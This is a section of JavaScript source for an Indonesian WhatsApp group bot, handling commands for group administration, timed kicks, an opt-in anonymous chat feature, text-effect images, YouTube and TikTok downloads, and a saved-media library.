if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
if (!q2 && !q3){ if (Tag() == "") return reply("Tag Orang yang mau anda kick")
return satzz.sendMessage(from, {
text: `[ *KICK-TIMERS* ]\nSilahkan Pilih Time`,
buttonText: "OPEN",
sections:  [{title: "TIMERS", rows: [
{title: "10 DETIK", rowId: prefix + "kicktime " + Tag() + "&" + 10000 + "&10 Detik"},
{title: "20 DETIK", rowId: prefix + "kicktime " + Tag() + "&" + 20000 + "&20 Detik"},
{title: "30 DETIK", rowId: prefix + "kicktime " + Tag() + "&" + 30000 + "&30 Detik"},
{title: "1 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 60000 + "&1 Menit"},
{title: "5 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 300000 + "&2 Menit"},
{title: "10 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 600000 + "&10 Menit"},
{title: "15 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 900000 + "&15 Menit"},
{title: "30 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 1800000 + "&30 Menit"},
{title: "1 JAM", rowId: prefix + "kicktime " + Tag() + "&" + 3600000 + "&1 Jam"}
]}]
})}
if (q1 && q2 && q3) {
satzz.sendMessage(from, {text:`[ *KICK-TIMERS* ]\nSukses mengatur jadwal, @${q1.split("@")[0]} akan terKick Dalam ${q3}`, mentions:[`${q1.split("@")[0]}@s.whatsapp.net`]},{quoted:sat1}) 
setTimeout( () => {
satzz.groupParticipantsUpdate(from, [q1], "remove").catch(e => {only("error", satzz, from)})
satzz.sendMessage(from, {text:`[ *KICK-TIMERS* ]\nWaktu habis, Bye Byee!! @${q1.split("@")[0]}`, mentions:[`${q1.split("@")[0]}@s.whatsapp.net`]},{quoted:sat1}) 
}, q2)
}
break
case 'test':
sendKatalog(from, footer, footer, footer, thumb)
break
case 'add': 
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
if (!q) return reply("Masukkan Nomer, Contoh 62xxxxx")
var nyz = phone('+' + q);
if (nyz.isValid == false) return reply("Nomer Yang anda masukkan tidak valid, Lakukan Seperti petunjuk yang di berikan, Contoh 62xxxx")
await satzz.groupParticipantsUpdate(from, [nyz.phoneNumber.split("+")[1] + "@s.whatsapp.net"], "add").catch(e => {only("error", satzz, from)})
break
case 'repeat':
var tt =`${q1}.repeat(q2)`
reply(tt)
break
case 'promote':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
if (Tag() == "") return reply("tag Orang yang mau anda promote")
satzz.sendMessage(from, {text:`Selamat @${Tag()[0].split("@")[0]} Anda sekarang adalah admin👑`, mentions:[`${Tag()[0].split("@")[0]}@s.whatsapp.net`]},{quoted:sat1}) 
await satzz.groupParticipantsUpdate(from, Tag(), "promote").catch(e => {only("error", satzz, from)})
break
case 'demote':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
if (Tag() == "") return reply("tag Orang yang mau anda demote")
satzz.sendMessage(from, {text:`Yahhh @${Tag()[0].split("@")[0]} Anda sekarang Bukan admin lagi😪`, mentions:[`${Tag()[0].split("@")[0]}@s.whatsapp.net`]},{quoted:sat1}) 
await satzz.groupParticipantsUpdate(from, Tag(), "demote").catch(e => {only("error", satzz, from)})
break 
case 'setname': case 'setsubject': case 'updatename':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
if (!q) return reply("Masukkan Text")
if (q.length > 25) return reply("Nama terlalu panjang")
await satzz.groupUpdateSubject(from, q)
only("sukses", satzz, from)
break
case 'setdesk': case 'setdeks': case 'updatedesk':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
if (!q) return reply("Masukkan Text")
if (q.length > 500) return reply("Nama terlalu panjang")
await satzz.groupUpdateDescription(from, q)
only("sukses", satzz, from)
break 
case 'tutup': case 'close': case 'closegroup':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
await satzz.groupSettingUpdate(from, 'announcement')
only("sukses", satzz, from)
break
case 'open': case 'buka': case 'opengroup':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
await satzz.groupSettingUpdate(from, 'not_announcement')
only("sukses", satzz, from)
break
case 'unlocked': 
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
await satzz.groupSettingUpdate(from, 'unlocked')
only("sukses", satzz, from)
break
case 'locked': 
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
await satzz.groupSettingUpdate(from, 'locked')
only("sukses", satzz, from)
break
case 'linkgc': case 'linkgrup': case 'linkgrub': case 'linkgroup': case 'getlink':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
var nyz = await satzz.groupInviteCode(from)
reply("[ *GROUP-CODE(LINK)* ]\nhttps://chat.whatsapp.com/" + nyz)
break
case 'revoke': case 'risetlink': 
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
await satzz.groupRevokeInvite(from)
only("sukses", satzz, from)
break
case 'welcome':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
if (!q) return satzz.sendMessage(from, {text: "[ *WELCOME* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "WELCOME (AKTIF)", rowId: prefix + command + " aktif"},{title: "WELCOME (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]})
if (q == "aktif") {
if (dataOnly("welcome", "cek", from) == from) return reply("welcome pada group ini telah aktif sebelumnya")
only("sukses", satzz, from)
dataOnly("welcome", "add", from)
} else 
if (q == "nonaktif"){
if (dataOnly("welcome", "cek", from) !== from) return reply("welcome pada group ini telah nonaktif sebelumnya")
only("sukses", satzz, from)
dataOnly("welcome", "remove", from)
} else { satzz.sendMessage(from, {text: "[ *WELCOME* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "WELCOME (AKTIF)", rowId: prefix + command + " aktif"},{title: "WELCOME (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]}) } 
break
case 'antilink':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", satzz, from)
if (!isGroupAdmins) return only("isGroupAdmins", satzz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", satzz, from)
if (!q) return satzz.sendMessage(from, {text: "[ *ANTILINK* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "ANTILINK (AKTIF)", rowId: prefix + command + " aktif"},{title: "ANTILINK (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]})
if (q == "aktif") {
if (dataOnly("antilink", "cek", from) == from) return reply("antilink pada group ini telah aktif sebelumnya")
only("sukses", satzz, from)
dataOnly("antilink", "add", from)
} else 
if (q == "nonaktif"){
if (dataOnly("antilink", "cek", from) !== from) return reply("antilink pada group ini telah nonaktif sebelumnya")
only("sukses", satzz, from)
dataOnly("antilink", "remove", from)
} else { satzz.sendMessage(from, {text: "[ *ANTILINK* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "ANTILINK (AKTIF)", rowId: prefix + command + " aktif"},{title: "ANTILINK (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]}) } 
break
case 'setstatus': case 'updatestatus':
if (!isOwner) return only("isOwner", satzz, from)
if (!q) return reply("Masukkan text")
if (q.length > 130) return reply("text terlalu panjang")
await satzz.updateProfileStatus(q)
only("sukses", satzz, from)
break
case 'setnamabot': case 'setnamebot': 
if (!isOwner) return only("isOwner", satzz, from)
if (!q) return reply("Masukkan text")
if (q.length > 24) return reply("text terlalu panjang")
await satzz.updateProfileName(q)
only("sukses", satzz, from)
break
case 'getpp': 
if (!isGroup) return only("isGroup", satzz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", satzz, from)
try{ var nyz = await satzz.profilePictureUrl(Tag()[0], 'image') } catch (e) { var nyz = "http://assets.kompasiana.com/items/album/2021/03/24/blank-profile-picture-973460-1280-605aadc08ede4874e1153a12.png" }
satzz.sendMessage(from, {image:{url:nyz}, caption:"xxx", mentions:[sender]},{quoted:sat1})
break
case 'getname':
if (!isGroup) return only("isGroup", satzz, from)
if (Tag() == "") return reply("tag Orang")
var neme = await satzz.getName(Tag()[0])
satzz.sendButtonText(from, butDefault, `NAME : ${neme}`, footer)
break
case 'block': case 'ban': case 'banned':
if (!isGroup) return only("isGroup", satzz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", satzz, from)
await satzz.updateBlockStatus(Tag()[0], "block")
setUser("±ban", `${Tag()[0]}`, true)
only("sukses", satzz, from)
break 
case 'unblock': case 'unban': case 'unbanned':
if (!isGroup) return only("isGroup", satzz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", satzz, from)
await satzz.updateBlockStatus(Tag()[0], "unblock")
setUser("±ban", `${Tag()[0]}`, false)
only("sukses", satzz, from)
break  
case 'creategroup':
if (!isOwner) return only("isOwner", satzz, from)
if (!q) return reply("Masukkan text")
const group = await satzz.groupCreate(q, [owner + "@s.whatsapp.net"])
only("sukses", satzz, from)
satzz.sendMessage(group.id, { text: 'Halo!!' }) // say hello to everyone on the group
break
case 'plusstar':
if (!isGroup) return only("isGroup", satzz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", satzz, from)
only("sukses", satzz, from)
setUser("+star", `${Tag()[0]}`, 1)
break 
case 'minusstar':
if (!isGroup) return only("isGroup", satzz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", satzz, from)
only("sukses", satzz, from)
setUser("-star", `${Tag()[0]}`, 1)
break
case 'toimg':
if (isMedia || isQuotedSticker) { 
download("sticker", "toimgg").then(x => { sendMedia("image", "./media/toimgg.webp", "SUKSES") })
} else { reply("Reply Sticker")}
break
case 'script': 
case 'sc':
case 'sourcecode':
const buttonImage = {
image: thumb,
fileLength: 88808964843634667969,
caption: '*_[ SOURCECODE ]_*'+ readMore +'\nhttps://bit.ly/SatganzDevs',
footer: footer,
mentions: [sender],
templateButtons: butDefault,
headerType: 4,
contextInfo: { externalAdReply: { showAdAttribution: true,
mediaUrl: 'https://instagram.com/satganzdevs.xyz',
mediaType: 2, 
description: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
title: "Join Group Whatsapp Official",
body: footer,
thumbnail: thumb,
sourceUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq'}}}
satzz.sendMessage(from, buttonImage, { quoted : sat })
break
case 'confes': case 'menfes': case 'confess': case 'menfess':
if (!isPrivate) return rpy(from, 'Private Chat Only!')
if (!q1) return reply(`> Masukkan\n${prefix + command} Nomer\n\n> Contoh?\n${prefix + command} 62xxx`)
var nyz = phone('+' + q1);
if (nyz.isValid == false) return reply("Nomer Yang anda masukkan tidak valid")
var cekon = await satzz.onWhatsApp(nyz)
if (nyz + '@s.whatsapp.net' == sender) return reply('its your self bitch!')
if (!cekon.length == 0) return reply(`Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`)
if (isMenfess) return reply(`Telah Ada Sesi Menfess Sebelumnya ketik delmenfess untuk menghapus`)
reply('Menunggu Konfirmasi Dari Penerima...')
var tgt = q1.replace(/[^@0-9]/g, '')+ "@s.whatsapp.net"
if (tgt  == sender) return reply('its your self bitch!')
var nome = await satzz.getName(tgt)
var menfessMessage = {
image : fs.readFileSync('./media/menfess.jpg'),
fileLength: 11111111111111,
caption : `hai ${nome}!, *${pushname} Mengajakmu untuk Chatan Di Dalam Bot.\n ketik tombol di bawah untuk merespon`,
footer : footer,
buttons: [{ buttonId: `.sure ${sender}`, buttonText: { displayText: 'T E R I M A' }, type: 1 }, { buttonId: '.tolak', buttonText: { displayText: 'T O L A K' }, type: 1 }],
headerType: 2,
contextInfo: { 
externalAdReply: { 
showAdAttribution: true,
mediaUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
mediaType: 2, 
description: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
title: "Join Group Whatsapp Official",
body: footer,
thumbnail: thumb,
sourceUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq'}}}
satzz.sendMessage(tgt, menfessMessage)
break
case 'sure':
menfessAdd(q, sender)
await sleep(3000)
reply("chat has connected!")
for (let i of menfess) {
var o = [];
o.push(i.kepada)
satzz.sendMessage(i.dari, { text: "Terhubung\n\n balas delmenfess untuk menghentikan chat!" }, { quoted: sat })
}
break
case 'tolak':
for (let i of menfess) {
            var o = [];
            o.push(i.kepada)
satzz.sendMessage(i.dari, { text: `${pushname} Menolak Menfess anda.` }, { quoted: sat })
}
only("sukses", satzz, from)
break
case 'dellmenfess':
case 'delmenfess':
case 'dm':
case 'delfess':
if (!isMenfess) return reply("Tidak Ada Sesi Di Akun Anda!")
if (isTo) {
for (let i of menfess) {
var o = [];
o.push(i.dari)
let buttons = [{ buttonId: '.owner', buttonText: { displayText: 'o w n e r' }, type: 1 }, { buttonId: '.menu', buttonText: { displayText: 'M E N U' }, type: 1 }]
let buttonMessage = {
image: fs.readFileSync('./media/menfess.jpg'),
caption : 'Lawan BicaraMu Telah Menghentikan Menfess',
footer : footer,
buttons: buttons,
headerType: 2,
contextInfo: { 
externalAdReply: { 
showAdAttribution: true,
mediaUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
mediaType: 2, 
description: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
title: "Join Group Whatsapp Official",
body: footer,
thumbnail: thumb,
sourceUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq'}}
}
satzz.sendMessage(i.dari, buttonMessage)
var posi = menfess.indexOf(i.dari, sender)
menfess.splice(posi, 1)
fs.writeFileSync('./lib/menfess.json', JSON.stringify(menfess, null, 2))
only("sukses", satzz, from) 
}
} else if (isSend) {
for (let i of menfess) {
var o = [];
o.push(i.kepada)
let buttons = [{ buttonId: '.owner', buttonText: { displayText: 'o w n e r' }, type: 1 }, { buttonId: '.menu', buttonText: { displayText: 'M E N U' }, type: 1 }]
let buttonMessage = {
image: fs.readFileSync('./media/menfess.jpg'),
caption : 'Lawan BicaraMu Telah Menghentikan Menfess',
footer : footer,
buttons: buttons,
headerType: 2,
contextInfo: { 
externalAdReply: { 
showAdAttribution: true,
mediaUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
mediaType: 2, 
description: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
title: "Join Group Whatsapp Official",
body: footer,
thumbnail: thumb,
sourceUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq'}}
}
satzz.sendMessage(i.kepada, buttonMessage)
var posi = menfess.indexOf(sender, i.kepada)
menfess.splice(posi, 1)
fs.writeFileSync('./lib/menfess.json', JSON.stringify(menfess, null, 2))
only("sukses", satzz, from)
}
}
break
case 'report': case 'bug':
if (!q) return reply("Ada kesalahan/Error Pada fitur? Silahkan masukkan Nama fitur yang bermasalah Kesini\nContoh? #report sticker")
satzz.sendMessage(owner + "@s.whatsapp.net", {text: `[ *NEW-NOTIF* ]\nHalo *${namaowner}*, Ada keluhan untuk kamu, Dari *@${sender.split("@")[0]}*, Katanya *"${q} Tidak bisa digunakan"*, Dia ngirim pesan ini pas jam ${time}`, mentions:[sender]},{quoted:sat1})
reply("Terimakasih telah melaporkan bug/error pada fitur, Jika benar Fitur bermasalah owner akan memperbaiki masalah ini secepatnya, Owner akan mengabaikan jika pesan ini palsu")
break
case 'technology': case 'cuttext': case 'neonlight': case 'thundertext': case 'transformer': case 'sketchtext': case 'lighttext': 
case 'giraffetext':  case 'glasstext': case 'signtext': case 'juicetext': case 'typography': case 'potterytext': case 'comictext': case 'ruststyle': 
if (!q) return reply("Masukkan text")
if (command == "technology"){ var nyz1 = "https://textpro.me/create-a-futuristic-technology-neon-light-text-effect-1006.html" } else if (command == "cuttext"){ var nyz1 = "https://textpro.me/create-art-paper-cut-text-effect-online-1022.html" } else if (command == "neonlight"){ var nyz1 = "https://textpro.me/create-3d-neon-light-text-effect-online-1028.html" } else if (command == "thundertext"){ var nyz1 = "https://textpro.me/online-thunder-text-effect-generator-1031.html" } else if (command == "transformer"){ var nyz1 = "https://textpro.me/create-a-transformer-text-effect-online-1035.html" } else if (command == "sketchtext"){ var nyz1 = "https://textpro.me/create-a-sketch-text-effect-online-1044.html" } else if (command == "lighttext"){ var nyz1 = "https://textpro.me/create-glowing-neon-light-text-effect-online-free-1061.html" } else if (command == "giraffetext"){ var nyz1 = "https://textpro.me/create-3d-giraffe-text-effect-online-1069.html" } else if (command == "glasstext"){ var nyz1 = "https://textpro.me/create-3d-style-glass-text-effect-online-1072.html" } else if (command == "signtext"){ var nyz1 = "https://textpro.me/3d-business-sign-text-effect-1078.html" } else if (command == "juicetext"){ var nyz1 = "https://textpro.me/create-a-3d-orange-juice-text-effect-online-1084.html" } else if (command == "typography"){ var nyz1 = "https://textpro.me/create-artistic-typography-online-1086.html" } else if (command == "potterytext"){ var nyz1 = "https://textpro.me/create-3d-pottery-text-effect-online-1088.html" } else if (command == "comictext"){ var nyz1 = "https://textpro.me/create-3d-comic-text-effects-online-1091.html" } else if (command == "ruststyle"){ var nyz1 = "https://textpro.me/create-a-3d-rust-style-text-effect-online-1093.html" }
only("proses", satzz, from)
var nyz = await textPro1(nyz1, q).catch(e => { only("error", satzz, from) })
sendMedia("image", nyz.result.url_file, `[ *TEXTPRO* ]\n• *Title* : ${command}\n• *Text1* : ${q}\n• *Status* : true`).catch(e => { only("error", satzz, from) })
break
case 'steeltext': case 'metalgold': case 'metalgalaxy': case 'rosegold': case 'metalonline': case 'logoonline': case 'stonetext': 
case 'styletiktok': case 'vintage': case 'graffititext': case 'texteffect': case 'layeredtext': case 'screentext': case 'summertext':
if (!q1 && !q2) return reply("Masukkan text1&text2")
if (command == "steeltext"){ var nyz1 = "https://textpro.me/3d-steel-text-effect-877.html" } else if (command == "metalgold"){ var nyz1 = "https://textpro.me/text-logo-3d-metal-gold-944.html" } else  if (command == "metalgalaxy"){ var nyz1 = "https://textpro.me/text-logo-3d-metal-galaxy-943.html" } else  if (command == "rosegold"){ var nyz1 = "https://textpro.me/text-logo-3d-metal-rose-gold-945.html" } else if (command == "metalonline"){ var nyz1 = "https://textpro.me/create-text-logo-3d-metal-online-957.html" } else if (command == "logoonline"){ var nyz1 = "https://textpro.me/pornhub-style-logo-online-generator-free-977.html" } else if (command == "stonetext"){ var nyz1 = "https://textpro.me/create-a-stone-text-effect-online-982.html" } else if (command == "styletiktok"){ var nyz1 = "https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html" } else if (command == "vintage"){ var nyz1 = "https://textpro.me/create-realistic-vintage-style-light-bulb-1000.html" } else if (command == "graffititext"){ var nyz1 = "https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html" } else if (command == "texteffect"){ var nyz1 = "https://textpro.me/create-a-glitch-text-effect-online-free-1026.html" } else if (command == "layeredtext"){ var nyz1 = "https://textpro.me/create-layered-text-effects-online-free-1032.html" } else if (command == "screentext"){ var nyz1 = "https://textpro.me/color-led-display-screen-text-effect-1059.html" } else if (command == "summertext"){ var nyz1 = "https://textpro.me/create-a-summer-text-effect-with-a-palm-tree-1083.html" } 
only("proses", satzz, from) 
var nyz = await textPro2(nyz1, q1, q2).catch(e => { only("error", satzz, from) })
sendMedia("image", nyz.result.url_file, `[ *TEXTPRO* ]\n• *Title* : ${command}\n• *Text1* : ${q1}\n• *Text2* : ${q2}\n• *Status* : true`).catch(e => { only("error", satzz, from) })
break
case 'baperin1': case 'baperin2': case 'baperin3': case 'baperin4': case 'baperin5': case 'baperin6': case 'baperin7': case 'baperin8': case 'baperin9':  case 'baperin10': 
var nyz = body.slice(8).trim().split(/ +/).shift().toLowerCase()
if (Tag() == "") { var x1 = sender.split("@")[0] } else if (isGroup && Tag() !== "") { var x1 = Tag()[0].split("@")[0] }
if (nyz == 1) { var x = `Jika saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekadar membuat @${x1} tertawa. Aku rela` }
if (nyz == 2) { var x = `Jangankan memilikimu, mendengar @${x1} kentut aja aku sudah bahagia` }
if (nyz == 3) { var x = `Ada 3 hal yang paling aku sukai di dunia ini, yaitu matahari, bulan dan @${x1}. Matahari untuk siang hari, bulan untuk malam hari, dan @${x1} untuk selamanya di hatiku` }
if (nyz == 4) { var x = `@${x1} itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya` }
if (nyz == 5) { var x = `Kalau @${x1} adalah bumi, maka aku adalah atmosfernya. Dengan begitu setiap saat bisa melindungimu dari sakitnya serangan meteor dan komet` }
if (nyz == 6) { var x = `@${x1} memang seperti lempeng bumi, bergeser sedikit saja sudah mengguncang hatiku` }
if (nyz == 7) { var x = `Kata dimulai dengan ABC, angka dimulai dengan 123. Lagu dimulai dengan do re mi. Cinta dimulai dengan aku dan @${x1}` }
if (nyz == 8) { var x = `Ada 12 bulan dalam setahun, 30 hari dalam sebulan, 7 hari dalam seminggu, 60 detik dalam satu jasat. Tapi hanya ada @${x1} seorang sepanjang hidupku` }
if (nyz == 9) { var x = `Sejak mengenal @${x1} bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu @${x1}` }
if (nyz == 10) { var x = `Napas aku kok sesek banget ya? Oh iya Karena separuh napasku ada di @${x1}` }
sendMedia("vn", "./media/baperin.mp3")
if (Tag() == "") return reply(x)
satzz.sendMessage(from, {text:x, mentions:Tag()},{quoted:sat1})
break
case 'wangy': case 'sherk': case 'simp': case 'nenen': 
if (Tag() == "") return reply("tag Orang")
if (command == "wangy"){ var nyz = await api.stress.wangy("@" + Tag()[0].split("@")[0]) }
if (command == "nenen"){ var nyz = await api.stress.nenen("@" + Tag()[0].split("@")[0]) }
if (command == "simp"){ var nyz = await api.stress.simp("@" + Tag()[0].split("@")[0]) }
if (command == "sherk"){ var nyz = await api.stress.sherk("@" + Tag()[0].split("@")[0]) }
satzz.sendMessage(from, {text:nyz, mentions:Tag()},{quoted:sat1})
break
case 'j':
case 'joins':
case 'join':
if (!isOwner && !isPremium) return reply('Luwh Siapa?')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await satzz.groupAcceptInvite(result)
break
case 'playmp3': case 'playaudio': 
if (!q) return reply("Masukkan Query")
only("proses", satzz, from) 
var nyz = await api.downloader.youtube.ytplay(q).catch(e => { only("error", satzz, from) })
var nyz1 = await api.tools.shortlink(nyz.result, makeid(10))
reply(`[ *PLAY-MP3* ]\nMengirim audio Berat tidak dapat dilakukan oleh bot ini, Silahkan Download sendiri audio Nya ${nyz1.result.url} `)
break
case 'playmp4': case 'playvideo': 

if (!q) return reply("Masukkan Query")
only("proses", satzz, from) 
var nyz = await api.downloader.youtube.ytplayvid(q).catch(e => { only("error", satzz, from) })
var nyz1 = await api.tools.shortlink(nyz.result, makeid(10))
reply(`[ *PLAY-MP4* ]\nMengirim video Berat tidak dapat dilakukan oleh bot ini, Silahkan Download sendiri video Nya ${nyz1.result.url} `)
break
case 'ytvideo': case 'ytmp4':

if (!q) return reply("Masukkan Url")
only("proses", satzz, from) 
var nyz = await api.downloader.youtube.ytplayvid(q).catch(e => { only("error", satzz, from) })
var nyz1 = await api.tools.shortlink(nyz.result, makeid(10))
reply(`[ *YT-MP4* ]\nMengirim video Berat tidak dapat dilakukan oleh bot ini, Silahkan Download sendiri video Nya ${nyz1.result.url} `)
break
case 'ytmp3': case 'ytaudio': 
if (!q) return reply("Masukkan Url")
only("proses", satzz, from) 
var nyz = await api.downloader.youtube.ytplay(q).catch(e => { only("error", satzz, from) })
var nyz1 = await api.tools.shortlink(nyz.result, makeid(10))
reply(`[ *YT-MP3* ]\nMengirim audio Berat tidak dapat dilakukan oleh bot ini, Silahkan Download sendiri audio Nya ${nyz1.result.url} `)
break
case 'tiktokaudio': case 'tiktokmp3':
if (!q) return reply("Masukkan Url")
only("proses", satzz, from) 
var nyz = await fetchJson(`https://malesin.xyz/tiktok?url=${q}`)
satzz.sendMessage(from, { audio: { url: nyz.audio }, contextInfo: { 
externalAdReply: { 
showAdAttribution: true,
mediaUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
mediaType: 2, 
description: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
title: "Join Group Whatsapp Official",
body: footer,
thumbnail: thumb,
sourceUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq'}}}, { quoted : sat })
break
case 'tiktokvideo': case 'tiktokmp4':
case 'tiktok': case 'ttnowm': case 'tiktoknowm':
if (!q) return reply("Masukkan Url")
only("proses", satzz, from) 
var nyz = await fetchJson(`https://malesin.xyz/tiktok?url=${q}`)
const butmek = {
video: { url: nyz.video },
caption: `*TITLE* : ${nyz.title}\n*AUTHOR* : ${nyz.author}`,
footer: footer,
mentions: [sender],
buttons: [{ buttonId: '.tiktokmp3 ' + q, buttonText: { displayText: '🎶 AUDIO' }, type: 1 }],
headerType: 4,
contextInfo: { 
externalAdReply: { 
showAdAttribution: true,
mediaUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
mediaType: 2, 
description: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
title: "Join Group Whatsapp Official",
body: footer,
thumbnail: thumb,
sourceUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq'}}
}
satzz.sendMessage(from, butmek)
break
case 'addfoto': case 'addimg': case 'addimage':
if (isMedia || isQuotedImage) { 
if (!q) return reply(`Masukkan Query Nama image, Contoh ${prefix + command} megawati`)
if (args.length !== 1) return reply("Masukkan Query nama image cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("image", q) == q) return reply("Nama Image tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("image", q)
addMedia("image", q)
reply(`[ *IMAGE-SAVE* ]\nSukses, Image("${q}.jpg") Berhasil terSave di database bot ini, Silahkan cek Image kamu di #listimage`)
} else reply(`Kirim image Dengan caption ${prefix + command}`)
break 
case 'getimg': case 'getimage': case 'getfoto':
if (!q) return reply(`Masukkan Query Nama image, List? Gunakan command #listimage`)
if (cekMedia("image", q) !== q) return reply("Nama Image tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listimage")
sendMedia("image",`./media/${q}.jpg`)
break
case 'listimg': case 'listimage': case 'listfoto':
if (ImageMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add image terlebih dahulu, Gunakan command #addimage")
satzz.sendMessage(from, {text: `[ *LIST-IMAGE* ]\n• *Total* : ${ImageMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("image")}]
})
break
case 'deleteimg': case 'dellimg': case 'deleteimage': case 'dellimage': case 'deletefoto': case 'dellfoto': 
if (!isOwner) return only("isOwner", satzz, from)
if (!q) return reply("Masukkan nama image yang ingin dihapus")
if (cekMedia("image", q) !== q) return reply("Nama Image tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listimage")
deleteMedia("image", q)
only("sukses", satzz, from)
break

case 'addvideo': case 'addmp4': 
if (isMedia || isQuotedVideo) {  
if (!q) return reply(`Masukkan Query Nama Video, Contoh ${prefix + command} megawati`)
if (args.length !== 1) return reply("Masukkan Query nama video cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("video", q) == q) return reply("Nama video tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("video", q)
addMedia("video", q)
reply(`[ *VIDEO-SAVE* ]\nSukses, Video("${q}.mp4") Berhasil terSave di database bot ini, Silahkan cek Video kamu di #listvideo`)
